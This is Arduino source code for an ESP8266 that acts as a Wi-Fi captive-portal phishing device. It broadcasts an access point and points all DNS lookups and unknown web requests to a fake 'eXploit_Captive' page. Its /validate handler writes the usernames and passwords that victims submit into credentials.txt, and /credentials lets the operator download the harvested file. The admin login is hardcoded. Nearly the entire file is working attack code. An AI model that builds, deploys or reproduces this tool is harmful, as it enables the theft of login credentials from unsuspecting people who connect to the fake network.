#include <Arduino.h>
#include <ArduinoJson.h>
#include <ESP8266WiFi.h>
#include <WiFiClient.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <LittleFS.h>
#include "FS.h"
#include "Filesystem.h"
#include "WebHTML.h"

const char* username = "exploit";
const char* password = "admin";

IPAddress apIP(18, 18, 18, 18);
const byte DNS_PORT = 53;
DNSServer dnsServer;
ESP8266WebServer webServer(80);

void exploitCaptive() {
  webServer.send(200, "text/html", eXploit_Captive);
}

void exploitConfig() {
  if(!webServer.authenticate(username, password))
  return webServer.requestAuthentication();
  webServer.send(200, "text/html", eXploit_Config);
}

void setup() {

  Serial.begin(115200);
  Serial.println("");
  delay(1000);
  Serial.println("Mounting FS...");

  if (!LittleFS.begin()) {
    Serial.println("Failed to mount file system");
    LittleFS.format();
    ESP.restart();
    return;
  }

  if (!loadConfig()) {
    Serial.println("Failed to load config");
  if (!defaultConfig()) {
    Serial.println("Failed to save default config"); }
    else {
    Serial.println("Default config saved");
    delay(1000);
    ESP.restart(); } }
    else {
   Serial.println("Config loaded"); }

  Serial.print("Configuring access point...");
  WiFi.softAP(ssid, pass);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  dnsServer.start(DNS_PORT, "*", apIP);
  
  webServer.onNotFound([]() {
  exploitCaptive();
  });

  webServer.begin();

  webServer.on("/", exploitConfig);

  webServer.on("/saveconfig", []() {
  StaticJsonDocument<200> doc;
  doc["ssid"] = webServer.arg("ssid");
  doc["pass"] =  webServer.arg("pass");
 
  File configFile = LittleFS.open("/config.json", "w");
  if (!configFile) {
    Serial.println("Failed to open config file for writing");
    return false;
  }
  else
  Serial.println("Config saved successfuly");
  serializeJson(doc, configFile);
  delay(5000);
 
  });
  
  webServer.on("/validate", []() {
  File file = LittleFS.open("/credentials.txt", "a");
  if (!file) {
    Serial.println("Failed to write credentials");
    return;
  }
  if (file.print("\nUsername : " + webServer.arg("user"))) {
    Serial.println("Username Written");
  } else {
    Serial.println("\nUsername write failed");
  }
    if (file.print("\nPassword : " + webServer.arg("pass"))) {
    Serial.println("Password Written");
  } else {
    Serial.println("Password write failed");
  }
  delay(2000); 
  file.close();



  
});    

  webServer.on("/credentials", []() {
    File download = LittleFS.open("/credentials.txt", "r");
      if (!download) {
    Serial.println("Failed to read credentials file");
  }
    if (download) {
      webServer.sendHeader("Content-Type", "text/text");
      webServer.sendHeader("Content-Disposition", "attachment; filename=credentials.txt");
      webServer.sendHeader("Connection", "close");
      webServer.streamFile(download, "application/octet-stream");
      download.close();
    } 
 });

  webServer.on("/clear_cred", []() {
  
 File data = LittleFS.open("/credentials.txt", "r");
      if (!data) {
    Serial.println("Failed to read credentials file");
  }
     if (data) {
      if (LittleFS.remove("/credentials.txt")) {
          Serial.println(F("File deleted successfully")); }
       }      
      
});    



  webServer.on("/reboot", []() {
  
   Serial.println("Esp going to reboot");
   ESP.restart();
       
});


}
 void loop()
 {
  webServer.handleClient();
  dnsServer.processNextRequest();
  }
